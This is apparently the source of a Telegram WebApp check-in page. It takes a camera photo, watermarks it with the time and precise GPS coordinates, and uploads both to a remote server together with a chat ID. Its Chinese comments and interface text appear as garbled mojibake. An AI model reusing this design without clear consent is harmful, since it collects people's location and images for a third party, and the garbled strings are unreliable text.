<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>æ±‡ç›ˆå›½é™… - å®‰å…¨æ‹ç…§æ‰“å¡</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
  body { 
    margin:0; 
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif; 
    background:#000; 
    color:#fff; 
    overflow:hidden; 
    -webkit-tap-highlight-color: transparent;
    -webkit-touch-callout: none;
    -webkit-user-select: none;
    user-select: none;
  }
  #container { 
    position:relative; 
    width:100vw; 
    height:100vh; 
    background: #000;
  }
  video { 
    width:100%; 
    height:100%; 
    object-fit:cover; 
    transform: scaleX(-1); /* é•œåƒç¿»è½¬ï¼Œæ›´ç¬¦åˆè‡ªæ‹ä¹ æƒ¯ */
  }
  #overlay { 
    position:absolute; 
    top:20px; 
    left:20px; 
    right:20px;
    background:rgba(0,0,0,0.7); 
    padding:15px; 
    border-radius:12px; 
    font-size:16px; 
    line-height:1.4; 
    pointer-events:none; 
    backdrop-filter: blur(10px);
    border: 1px solid rgba(255,255,255,0.1);
  }
  #controls { 
    position:absolute; 
    bottom:30px; 
    left:50%; 
    transform:translateX(-50%); 
    z-index:10; 
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 15px;
  }
  button#capture {
    background:#fff; 
    border:none; 
    width:70px; 
    height:70px; 
    border-radius:50%; 
    font-size:28px; 
    cursor:pointer;
    box-shadow:0 4px 20px rgba(0,0,0,0.4); 
    outline:none; 
    position:relative; 
    overflow:hidden;
    transition: all 0.2s ease;
  }
  button#capture:active {
    transform: scale(0.95);
    box-shadow:0 2px 10px rgba(0,0,0,0.3);
  }
  button#capture:disabled { 
    opacity:0.5; 
    cursor:not-allowed; 
    transform: none !important;
  }

  #switchCamera {
    background: rgba(255,255,255,0.2);
    border: none;
    width: 50px;
    height: 50px;
    border-radius: 50%;
    font-size: 20px;
    color: white;
    cursor: pointer;
    backdrop-filter: blur(10px);
    border: 1px solid rgba(255,255,255,0.3);
  }

  /* Loading è½¬åœˆåŠ¨ç”» */
  #loadingOverlay {
    position:absolute; 
    top:0; 
    left:0; 
    width:100%; 
    height:100%; 
    background:rgba(0,0,0,0.85);
    display:flex; 
    flex-direction:column; 
    align-items:center; 
    justify-content:center; 
    z-index:100;
    opacity:0; 
    pointer-events:none; 
    transition:opacity 0.3s;
  }
  #loadingOverlay.show { 
    opacity:1; 
    pointer-events:all; 
  }
  .spinner {
    width:50px; 
    height:50px; 
    border:4px solid #333; 
    border-top:4px solid #4CAF50; 
    border-radius:50%;
    animation:spin 1s linear infinite; 
    margin-bottom:20px;
  }
  @keyframes spin { 
    to { transform:rotate(360deg); } 
  }

  #status { 
    position:absolute; 
    top:50%; 
    left:0; 
    right:0; 
    text-align:center; 
    color:#4CAF50; 
    font-size:16px; 
    padding:0 20px; 
    z-index:10;
    transform: translateY(-50%);
    background: rgba(0,0,0,0.7);
    padding: 15px;
    margin: 20px;
    border-radius: 10px;
    backdrop-filter: blur(10px);
  }

  .permission-hint {
    position: absolute;
    bottom: 120px;
    left: 20px;
    right: 20px;
    background: rgba(255,193,7,0.9);
    color: #000;
    padding: 12px;
    border-radius: 10px;
    font-size: 14px;
    text-align: center;
    animation: pulse 2s infinite;
  }

  @keyframes pulse {
    0% { opacity: 0.8; }
    50% { opacity: 1; }
    100% { opacity: 0.8; }
  }

  /* é€‚é…Telegramé¡¶éƒ¨æ  */
  @media (height: 100vh) {
    #container {
      height: 100vh;
    }
  }
</style>
</head>
<body>
<div id="container">
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <div id="overlay">
    <div id="time">è·å–æ—¶é—´ä¸­...</div>
    <div id="location">å‡†å¤‡è·å–ä½ç½®ä¿¡æ¯...</div>
  </div>

  <div id="status">ç‚¹å‡»ä¸‹æ–¹æ‹ç…§æŒ‰é’®å¼€å§‹æ‰“å¡</div>

  <div id="controls">
    <button id="switchCamera" style="display:none;">ğŸ”</button>
    <button id="capture">ğŸ“¸</button>
  </div>

  <!-- æƒé™æç¤º -->
  <div id="permissionHint" class="permission-hint" style="display:none;">
    ğŸ”’ é¦–æ¬¡ä½¿ç”¨è¯·å…è®¸ã€Œæ‘„åƒå¤´ã€å’Œã€Œä½ç½®ã€æƒé™
  </div>

  <!-- Loading åŠ¨ç”»å±‚ -->
  <div id="loadingOverlay">
    <div class="spinner"></div>
    <div style="font-size:16px; text-align:center;">æ­£åœ¨ä¸Šä¼ ç…§ç‰‡<br><small>è¯·å‹¿å…³é—­é¡µé¢</small></div>
  </div>
</div>

<script>
// ==================== é…ç½® ====================
const BACKEND_URL = "https://huiying888.onrender.com/upload";
const urlParams = new URLSearchParams(location.search);
const TARGET_CHAT_ID = urlParams.get('chatid');
// ===============================================

let stream = null;
let locationGranted = false;
let isUploading = false;
let currentFacingMode = 'user'; // é»˜è®¤å‰ç½®æ‘„åƒå¤´
let isFirstClick = true;

// åˆå§‹åŒ–Telegram WebApp
function initTelegramApp() {
  if (window.Telegram?.WebApp) {
    // è®¾ç½®Telegramä¸»é¢˜è‰²
    Telegram.WebApp.setHeaderColor('#000000');
    Telegram.WebApp.setBackgroundColor('#000000');
    Telegram.WebApp.expand();
    
    // ç¦ç”¨ä¸‹æ‹‰åˆ·æ–°
    Telegram.WebApp.disableVerticalSwipes();
  }
}

// å®æ—¶æ—¶é—´
function updateTime() {
  const now = new Date();
  document.getElementById('time').textContent = "ğŸ• " + now.toLocaleString('zh-CN', {hour12:false});
}
setInterval(updateTime, 1000);
updateTime();

// Telegram WebApp è‡ªåŠ¨å…³é—­ï¼ˆæˆåŠŸåï¼‰
function closeWebApp() {
  if (window.Telegram?.WebApp?.close) {
    setTimeout(() => {
      Telegram.WebApp.close();
    }, 3000);
  }
}

// æ˜¾ç¤º/éšè— loading
function showLoading(show) {
  document.getElementById('loadingOverlay').classList.toggle('show', show);
}

// åˆå§‹åŒ–æ‘„åƒå¤´
async function initCamera(facingMode = 'user') {
  try {
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
    
    const constraints = {
      video: {
        facingMode: facingMode,
        width: { ideal: 1920 },
        height: { ideal: 1080 }
      },
      audio: false
    };
    
    stream = await navigator.mediaDevices.getUserMedia(constraints);
    document.getElementById('video').srcObject = stream;
    
    // æ˜¾ç¤ºåˆ‡æ¢æ‘„åƒå¤´æŒ‰é’®ï¼ˆå¦‚æœè®¾å¤‡æ”¯æŒå¤šä¸ªæ‘„åƒå¤´ï¼‰
    if (navigator.mediaDevices.enumerateDevices) {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevices = devices.filter(device => device.kind === 'videoinput');
      if (videoDevices.length > 1) {
        document.getElementById('switchCamera').style.display = 'block';
      }
    }
    
    return true;
  } catch (error) {
    console.error('æ‘„åƒå¤´åˆå§‹åŒ–å¤±è´¥:', error);
    document.getElementById('status').textContent = "âŒ æ‘„åƒå¤´è®¿é—®å¤±è´¥ï¼Œè¯·æ£€æŸ¥æƒé™è®¾ç½®";
    return false;
  }
}

// åˆ‡æ¢æ‘„åƒå¤´
document.getElementById('switchCamera').addEventListener('click', async () => {
  if (isUploading) return;
  
  currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
  document.getElementById('status').textContent = "åˆ‡æ¢æ‘„åƒå¤´ä¸­...";
  
  await initCamera(currentFacingMode);
  
  document.getElementById('status').textContent = "âœ… æ‘„åƒå¤´å·²åˆ‡æ¢ï¼Œç‚¹å‡»æ‹ç…§";
});

// è·å–ä½ç½®ä¿¡æ¯
async function getLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      document.getElementById('location').textContent = "âŒ æµè§ˆå™¨ä¸æ”¯æŒå®šä½åŠŸèƒ½";
      resolve(null);
      return;
    }
    
    document.getElementById('status').textContent = "ğŸ“ æ­£åœ¨è·å–ç²¾ç¡®å®šä½...";
    
    const watchId = navigator.geolocation.watchPosition(
      (position) => {
        const lat = position.coords.latitude.toFixed(6);
        const lng = position.coords.longitude.toFixed(6);
        const acc = Math.round(position.coords.accuracy);
        
        document.getElementById('location').innerHTML = 
          `ğŸ“ ${lat}, ${lng}<br>ç²¾åº¦: ${acc}ç±³`;
        
        if (acc > 50) {
          document.getElementById('location').innerHTML += 
            '<br><span style="color:#ff9800">âš ï¸ å®šä½ç²¾åº¦è¾ƒä½ï¼Œå»ºè®®ç§»åŠ¨è‡³å¼€é˜”åŒºåŸŸ</span>';
        }
        
        window.currentLocation = { lat, lng, acc };
        locationGranted = true;
        navigator.geolocation.clearWatch(watchId);
        resolve({ lat, lng, acc });
      },
      (error) => {
        let errorMsg = "âŒ å®šä½è·å–å¤±è´¥";
        switch(error.code) {
          case error.PERMISSION_DENIED:
            errorMsg = "âŒ å®šä½æƒé™è¢«æ‹’ç»ï¼Œè¯·åœ¨è®¾ç½®ä¸­å…è®¸ä½ç½®è®¿é—®";
            break;
          case error.POSITION_UNAVAILABLE:
            errorMsg = "âŒ å®šä½ä¿¡æ¯ä¸å¯ç”¨";
            break;
          case error.TIMEOUT:
            errorMsg = "âŒ å®šä½è¯·æ±‚è¶…æ—¶";
            break;
        }
        document.getElementById('location').textContent = errorMsg;
        document.getElementById('status').textContent = "å®šä½å¤±è´¥ï¼Œæ‹ç…§å°†æ— ä½ç½®ä¿¡æ¯";
        resolve(null);
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
      }
    );
    
    // è¶…æ—¶ä¿æŠ¤
    setTimeout(() => {
      navigator.geolocation.clearWatch(watchId);
      if (!locationGranted) {
        document.getElementById('status').textContent = "å®šä½è¶…æ—¶ï¼Œå°†ä½¿ç”¨æœ€åè·å–çš„ä½ç½®";
        resolve(window.currentLocation || null);
      }
    }, 10000);
  });
}

// åˆå§‹é™é»˜å¼€å¯å‰ç½®æ‘„åƒå¤´ï¼ˆç”¨æˆ·ä½“éªŒæ›´å¥½ï¼‰
async function initPreviewCamera() {
  try {
    await initCamera('user');
    document.getElementById('status').textContent = "âœ… å‡†å¤‡å°±ç»ªï¼Œç‚¹å‡»æ‹ç…§æŒ‰é’®å¼€å§‹æ‰“å¡";
    document.getElementById('permissionHint').style.display = 'block';
  } catch (error) {
    document.getElementById('status').textContent = "âŒ æ‘„åƒå¤´åˆå§‹åŒ–å¤±è´¥ï¼Œè¯·åˆ·æ–°é¡µé¢é‡è¯•";
  }
}

// æ‹ç…§ä¸»é€»è¾‘
document.getElementById('capture').addEventListener('click', async () => {
  if (isUploading) return;
  
  // ç¬¬ä¸€æ¬¡ç‚¹å‡»æ—¶è·å–æƒé™å’Œä½ç½®
  if (isFirstClick) {
    isFirstClick = false;
    document.getElementById('permissionHint').style.display = 'none';
    
    // åˆ‡æ¢åˆ°åç½®æ‘„åƒå¤´ï¼ˆå¦‚æœéœ€è¦ï¼‰
    if (currentFacingMode !== 'environment') {
      document.getElementById('status').textContent = "ğŸ”„ åˆ‡æ¢åˆ°åç½®æ‘„åƒå¤´...";
      await initCamera('environment');
    }
    
    // è·å–ä½ç½®ä¿¡æ¯
    document.getElementById('status').textContent = "ğŸ“ è·å–å®šä½ä¿¡æ¯ä¸­...";
    await getLocation();
    
    document.getElementById('status').textContent = "âœ… å‡†å¤‡å°±ç»ªï¼Œç‚¹å‡»æ‹ç…§å®Œæˆæ‰“å¡";
    return; // ç¬¬ä¸€æ¬¡ç‚¹å‡»åªåšå‡†å¤‡å·¥ä½œ
  }
  
  // æ­£å¼æ‹ç…§é€»è¾‘
  if (!window.currentLocation) {
    const proceed = confirm("å®šä½ä¿¡æ¯å°šæœªå‡†å¤‡å¥½ï¼Œæ˜¯å¦ç»§ç»­æ‹ç…§ï¼Ÿï¼ˆç…§ç‰‡å°†æ— ä½ç½®ä¿¡æ¯ï¼‰");
    if (!proceed) return;
  }

  isUploading = true;
  const btn = document.getElementById('capture');
  btn.disabled = true;
  showLoading(true);
  document.getElementById('status').textContent = "æ­£åœ¨å¤„ç†ç…§ç‰‡...";

  try {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    
    // æ ¹æ®æ‘„åƒå¤´æ–¹å‘å†³å®šæ˜¯å¦é•œåƒç¿»è½¬
    if (currentFacingMode === 'user') {
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
    }
    
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // é‡ç½®å˜æ¢
    if (currentFacingMode === 'user') {
      ctx.setTransform(1, 0, 0, 1, 0, 0);
    }

    // æ·»åŠ æ°´å°
    const now = new Date().toLocaleString('zh-CN', {hour12:false});
    const locationText = window.currentLocation 
      ? `ç»çº¬åº¦ï¼š${window.currentLocation.lat},${window.currentLocation.lng} ç²¾åº¦:${window.currentLocation.acc}m`
      : 'ä½ç½®ä¿¡æ¯è·å–å¤±è´¥';
    
    const text = `${now}\n${locationText}`;
    ctx.font = 'bold 32px Arial';
    ctx.strokeStyle = 'rgba(0,0,0,0.8)';
    ctx.lineWidth = 6;
    ctx.fillStyle = 'rgba(255,255,255,0.9)';
    ctx.textBaseline = 'bottom';
    ctx.textAlign = 'left';

    // å·¦ä¸‹è§’æ°´å°
    const x = 30;
    const y = canvas.height - 30;
    ctx.strokeText(text, x, y);
    ctx.fillText(text, x, y);

    // è½¬æ¢ä¸ºBlobå¹¶ä¸Šä¼ 
    canvas.toBlob(async (blob) => {
      const formData = new FormData();
      formData.append('photo', blob, 'daka.jpg');

      const url = new URL(BACKEND_URL);
      url.searchParams.set('lat', window.currentLocation?.lat || '');
      url.searchParams.set('lng', window.currentLocation?.lng || '');
      url.searchParams.set('acc', window.currentLocation?.acc || '');
      url.searchParams.set('name', 'æ±‡ç›ˆç”¨æˆ·');
      url.searchParams.set('time', Date.now());
      if (TARGET_CHAT_ID) url.searchParams.set('chatid', TARGET_CHAT_ID);

      try {
        const response = await fetch(url, {
          method: 'POST',
          body: formData
        });
        
        const result = await response.json();
        
        if (result.code === 0) {
          document.getElementById('status').innerHTML = "âœ… æ‰“å¡æˆåŠŸï¼<br>3ç§’åè‡ªåŠ¨å…³é—­";
          setTimeout(closeWebApp, 3000);
        } else {
          throw new Error(result.msg || 'ä¸Šä¼ å¤±è´¥');
        }
      } catch (error) {
        console.error('ä¸Šä¼ é”™è¯¯:', error);
        document.getElementById('status').textContent = "âŒ ä¸Šä¼ å¤±è´¥: " + error.message;
        btn.disabled = false;
        isUploading = false;
        showLoading(false);
      }
    }, 'image/jpeg', 0.9);

  } catch (error) {
    console.error('æ‹ç…§é”™è¯¯:', error);
    document.getElementById('status').textContent = "âŒ æ‹ç…§å¤±è´¥ï¼Œè¯·é‡è¯•";
    btn.disabled = false;
    isUploading = false;
    showLoading(false);
  }
});

// é¡µé¢åŠ è½½å®Œæˆååˆå§‹åŒ–
window.addEventListener('load', () => {
  initTelegramApp();
  initPreviewCamera();
});

// é¡µé¢å¯è§æ€§å˜åŒ–å¤„ç†ï¼ˆé˜²æ­¢åˆ‡å±åæ‘„åƒå¤´åœæ­¢ï¼‰
document.addEventListener('visibilitychange', () => {
  if (!document.hidden && !stream) {
    initPreviewCamera();
  }
});
</script>
</body>
</html>
